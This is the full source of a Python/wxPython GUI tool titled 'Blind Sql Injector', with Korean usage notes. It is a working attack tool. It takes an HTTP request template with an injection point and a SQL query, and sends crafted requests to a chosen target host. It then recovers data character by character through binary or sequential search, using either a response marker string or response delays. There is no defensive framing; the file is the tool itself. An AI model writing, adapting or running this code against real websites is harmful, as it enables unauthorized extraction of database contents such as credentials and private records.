# -*- coding: cp949 -*-
import wx
from socket import socket, AF_INET, SOCK_STREAM
import time, sys, thread, urllib

class Frame(wx.Frame):
    def __init__(self, parent=None, id=-1, title=''):
        wx.Frame.__init__(self, parent, id, title, size=(1170,620),\
                          style=(wx.DEFAULT_FRAME_STYLE) &\
                          ~ (wx.RESIZE_BORDER|wx.MAXIMIZE_BOX|wx.MINIMIZE_BOX))

        panel = wx.Panel(self)
        
        menuItem = wx.Menu()
        menuItem.Append(1, "Usage")
        menuItem.Append(2, "Exit")
        self.Bind(wx.EVT_MENU, self.OnUsage, id=1)
        self.Bind(wx.EVT_MENU, self.OnClose, id=2)
                  
        menuBar = wx.MenuBar()
        menuBar.Append(menuItem, "Menu")
        self.SetMenuBar(menuBar)

        #스태틱
        wx.StaticText(panel, -1, "HTTP Header", (13,10))
        wx.StaticText(panel, -1, "HTTP Body", (13,320))
        wx.StaticText(panel, -1, "Host : ", pos=(485,50))
        wx.StaticText(panel, -1, "Port : ", pos=(485,75))
        wx.StaticText(panel, -1, "Index : ", pos=(485,125))
        wx.StaticText(panel, -1, " ~ ", pos=(560,125))
        wx.StaticText(panel, -1, "Scope : ", pos=(485,150))
        wx.StaticText(panel, -1, "TrueStr : ", pos=(485,235))
        wx.StaticText(panel, -1, "query : ", pos=(485,260))
        wx.StaticText(panel, -1, "Sleep : ", pos=(485,285))
        wx.StaticText(panel, -1, "Result", pos=(730,25))

        #체크박스
        
        self.ckbox = wx.CheckBox(panel,-1," toHex",(535,175),(60,20))
        self.ckbox4 = wx.CheckBox(panel,-1," Append",(600,175),(100,20))
        self.ckbox2 = wx.CheckBox(panel,-1," toTime",(652,235),(60,20))
        self.ckbox3 = wx.CheckBox(panel,-1," No Use",(630,125),(60,20))


        #에디트
        self.id_header = wx.TextCtrl(panel, -1, style=wx.TE_MULTILINE, pos=(10,30), size=(450,280))
        self.id_post = wx.TextCtrl(panel, -1, style=wx.TE_MULTILINE, pos=(10,340), size=(450,170))
        self.id_host = wx.TextCtrl(panel, -1, pos=(530,50), size=(150,20))
        self.id_port = wx.TextCtrl(panel, -1, pos=(530,75), size=(50,20))
        self.id_sindex = wx.TextCtrl(panel, -1, pos=(530,125), size=(26,20))
        self.id_eindex = wx.TextCtrl(panel, -1, pos=(583,125), size=(26,20))
        self.id_query = wx.TextCtrl(panel, -1, pos=(530,260), size=(180,20))
        self.id_StrTrue = wx.TextCtrl(panel, -1, pos=(542,235), size=(100,20))
        self.id_scope = wx.TextCtrl(panel, -1, pos=(530,150), size=(150,20))
        self.id_sleep = wx.TextCtrl(panel, -1, pos=(530,285), size=(35,20))
        self.id_result = wx.TextCtrl(panel, -1, style=wx.TE_MULTILINE, pos=(725,45), size=(420,470))

        self.id_sindex.SetValue('1')
        self.id_eindex.SetValue('1')
        self.id_scope.SetValue('0-127')
        self.id_port.SetValue('80')
        self.id_sleep.SetValue('0.3')
        
        #라디오 버튼
        SearchList1 = ['Sequence Search', 'Binary Search']
        SearchList2 = ['Get', 'Post']
        self.id_search = wx.RadioBox(panel, -1, " Search ", (485,330), wx.DefaultSize,SearchList1,1,wx.RA_SPECIFY_COLS)
        self.id_method = wx.RadioBox(panel, -1, " Method ", (620,330), wx.DefaultSize,SearchList2,1,wx.RA_SPECIFY_COLS) 

        self.id_search.SetSelection(1)
        
        #버튼
        StartButton = wx.Button(panel, label='    Start    ', size=(100,28), pos=(485,430))
        StopButton = wx.Button(panel, label='    Stop    ', size=(100,28), pos=(600,430))
        self.Bind(wx.EVT_BUTTON, self.OnStart, StartButton)
        self.Bind(wx.EVT_BUTTON, self.OnStop, StopButton)
        
        self.exit = False

    def OnUsage(self, event):
        wx.MessageBox('[*] HTTP Header 또는 Body에 쿼리 부분를 넣을 부분을  %s로 한다.\n'
                      '[*] seq_search는 \'=\' 연산자 사용.\n'
                      '[*] scope에 여러 범위 설정 가능. \nex)1-5,7,10-15,22\n'
                      '[*] bin_search는 true의 결과값에 \'<\'연산자 사용.\n'
                      '[*] query의 첫번째 %s는 index, 두번째 %s는 scope.\n'
                      '[*] scope에서 toHex시 0x는 들어가지 않음. \nex) \'90\'->\'5a\'\n'
                      '[*] post의 경우 HTTP header의 Content-Length에 %s를 넣어 준다.\n', 'Usage', wx.OK|wx.ICON_INFORMATION, self)
        
    def OnClose(self ,event):
        self.Destroy()
            
    def not_value(self, data):
        if(data.strip(' ') == ''):
            return True
        else:
            return False

    def __make_scope(self):
        result = []
        for tmp_scope in self.id_scope.GetValue().split(','):
            tmp_scope = tmp_scope.split('-')
            if len(tmp_scope) == 1:
                result += range(int(tmp_scope[0]), int(tmp_scope[0])+1)
            else:
                result += range(int(tmp_scope[0]), int(tmp_scope[1])+1)
        result = list(set(result))
        result.sort()
        return result
    
    def set_value(self):
        self.method = self.id_method.GetSelection()
        self.search = self.id_search.GetSelection()
        self.header = self.id_header.GetValue()
        self.post = self.id_post.GetValue()
        self.host = self.id_host.GetValue()
        self.port = self.id_port.GetValue()
        self.query = self.id_query.GetValue()
        self.query = urllib.quote(self.query).replace('%25', '%').replace('%', '%%')
        self.query = self.query.replace('%%s','%s')
        self.StrTrue = self.id_StrTrue.GetValue()
        self.option_dic = {'toHex':self.ckbox.IsChecked(), 'toTime':self.ckbox2.IsChecked(), 'noIndex':self.ckbox3.IsChecked(), 'append':self.ckbox4.IsChecked(), 'tsleep':self.id_sleep.GetValue()}    
        self.scope = self.__make_scope()

        if(self.option_dic['noIndex']):
            self.sindex = '1'
            self.eindex = '1'
        else:
            self.sindex = self.id_sindex.GetValue()
            self.eindex = self.id_eindex.GetValue()
            
    def OnStop(self, event):
        self.exit = True
        
    def OnStart(self, event):
        self.set_value()

        if(self.not_value(self.header)):
            wx.MessageBox('No header data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.method == 1 and self.not_value(self.post)):
            wx.MessageBox('No Post data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
        elif(self.not_value(self.host)):
            wx.MessageBox('No host data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.not_value(self.port)):
            wx.MessageBox('No port data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.not_value(self.sindex) or self.not_value(self.eindex)):
            wx.MessageBox('No index data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.not_value(self.query)):
            wx.MessageBox('No query data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.not_value(self.StrTrue)):
            wx.MessageBox('No True String', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.not_value(self.option_dic['tsleep'])):
            wx.MessageBox('No Sleep data', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        if(self.header.count('%s') != 1):
            wx.MessageBox('Input one %s in HTTP Header', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        if(self.method == 1 and self.post.count('%s') != 1):
            wx.MessageBox('Input one %s in HTTP Body', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(self.option_dic['noIndex'] and self.query.count('%s') != 1):
            wx.MessageBox('Input one %s in query', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
        elif(not self.option_dic['noIndex'] and self.query.count('%s') != 2):
            wx.MessageBox('Input two %s in query', 'Error', wx.OK|wx.ICON_INFORMATION, self)
            return False
            
        self.id_result.Clear()
        try:
            self.exit = False
            thread.start_new_thread(self.go_attack, ())
        except:
            pass
                                

    def go_attack(self):    
        start_msg = '\n================= INFO =================\n\n'
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        start_msg = 'Target Host : ' + self.host
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        start_msg = '\nPort : ' + self.port
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        if(self.option_dic['noIndex']):
            start_msg = '\nNo Index'
        else:
            start_msg = '\nIndex Range : ' +self.sindex+' ~ '+self.eindex
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        start_msg = '\nSearch Scope : ' + self.id_scope.GetValue()
        
        if(self.option_dic['toHex']):
            start_msg += "   [*] toHex"
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        
        start_msg = '\nSearch Algorithm : '
        if(self.search == 0):
            start_msg += 'Sequncial Search'
        else:
            start_msg += 'Binary Search'
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        
        start_msg = '\nMethod : '
        if(self.method == 0):
            start_msg += 'Get'
        else:
            start_msg += 'Post'
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        
        start_msg = '\n\n=======================================\n'
        self.id_result.AppendText(start_msg)
        time.sleep(0.1)
        start_msg = '================= START =================\n\n'
        self.id_result.AppendText(start_msg)

        StartAttack = Injection(self.StrTrue, self.header, self.post, self.method, self.host, self.port, self.option_dic)
        
        key = []
        if(self.search == 0): # 순차 탐색
            for index in range(int(self.sindex), int(self.eindex)+1):
                if self.exit:   ##루프 종료 
                    break

                result = StartAttack.seq_search(index, self.scope, self.query)
                if(result != False):
                    key.append(result)                 
                    print_data = 'index['+str(index).zfill(2)+'] : ' + chr(result) +'('+str(result)+')'
                    self.id_result.AppendText(print_data+'\n')
                    
                if (self.option_dic['append'] and self.option_dic['toHex']):
                    if self.option_dic['noIndex']:
                        self.query = self.query % '%s'+hex(result).replace('0x','')
                    else:
                        self.query = self.query % ('%s', '%s'+hex(result).replace('0x',''))
                    
                if result == 0:
                    break
                    
        else: # 이진 탐색
            for index in range(int(self.sindex), int(self.eindex)+1):
                if self.exit:   ##루프 종료 
                    break
                result = StartAttack.bin_search(index, self.scope, self.query)
                key.append(result)
                print_data = 'index['+str(index).zfill(2)+'] : ' + chr(result) +'('+str(result)+')'
                self.id_result.AppendText(print_data+'\n')

                if (self.option_dic['append'] and self.option_dic['toHex']):
                    if self.option_dic['noIndex']:
                        self.query = self.query % '%s'+hex(result).replace('0x','')
                    else:
                        self.query = self.query % ('%s', '%s'+hex(result).replace('0x',''))
                if result == 0:
                    break
              
        print_data = '\n\n------------------ result --------------\n\nString : '
        for i in key:
            print_data += chr(i)
            
        self.id_result.AppendText(print_data+'\n')
        
         
class App(wx.App):
    def OnInit(self):
        self.frame = Frame(None, -1, "Blind Sql Injector  -  by bbolmin")
        self.frame.Show()
        return True

    
class Injection():
    def __init__(self, StrTrue, r_header, r_post, method, host, port, option_dic):
        self.StrTrue = StrTrue.encode('cp949')
        self.r_header = r_header.replace('%', '%%').replace('%%s', '%s').strip('\r\n')
        self.r_post = r_post
        self.method = method
        self.host = host
        self.port = port
        self.toHex = option_dic['toHex']
        self.toTime = option_dic['toTime']
        self.sleep = option_dic['tsleep']
        self.noIndex = option_dic['noIndex']
        
    def go_request(self, r_data):
        time.sleep(float(self.sleep))
        
        if(self.method == 0): #get
            r_header = self.r_header % r_data
            send_data = r_header+'\r\n\r\n'
        else : #post
            r_post = self.r_post % (r_data)
            r_header = self.r_header % len(r_post)
            send_data = r_header+'\r\n\r\n' + r_post
        
        s = socket(AF_INET, SOCK_STREAM)
        try:
            s.connect((self.host, int(self.port)))
            s.settimeout(5)
            self.stime = time.time()
            s.send(send_data)
            response = s.recv(3000)
            self.etime = time.time()
        except:
            wx.MessageBox('Socket Error', 'Error', wx.OK|wx.ICON_INFORMATION)
            sys.exit()
    
        finally:
            s.close()

        return response
    
    def bin_search(self, Index, scope, Query): #(query)<90 '<'로 비교
        start = scope[0]
        end = scope[-1]
        
        mid = scope[len(scope)/2]
            
        if(self.toHex):
            h_mid = hex(mid).replace('0x','')
        else:
            h_mid = mid
        if(self.noIndex):
            query2 = Query % h_mid
        else :
            query2 = Query % (Index, h_mid)

        
        recv = self.go_request(query2)
        result = self.result_chk(recv)

        if(len(scope)<=2):
            if result == False:
                return end
            else:
                return start

        if(result == True):
            return self.bin_search(Index, scope[0:len(scope)/2], Query)
        else:
            return self.bin_search(Index, scope[(len(scope)/2):], Query)
        
    def seq_search(self, index, scope, Query): #(query)=90 '='로 비교
        for i in scope:
            if(self.toHex):
                h_i = hex(i).replace('0x','')
            else:
                h_i = i
            if(self.noIndex):
                query2 = Query % h_i
            else :
                query2 = Query % (index, h_i)    
            
            recv = self.go_request(query2)
            result = self.result_chk(recv)
            if result == True:
                return i
            
        return False

    def result_chk(self, recv):
        if (self.toTime):
            if((self.etime - self.stime) > float(self.StrTrue)):
                return True
            else:
                return False
        else :
            if(recv.find(self.StrTrue) != -1): #true일 때의 data
                return True
            else:
                return False
    
if __name__ == '__main__':
    app = App()
    app.MainLoop()


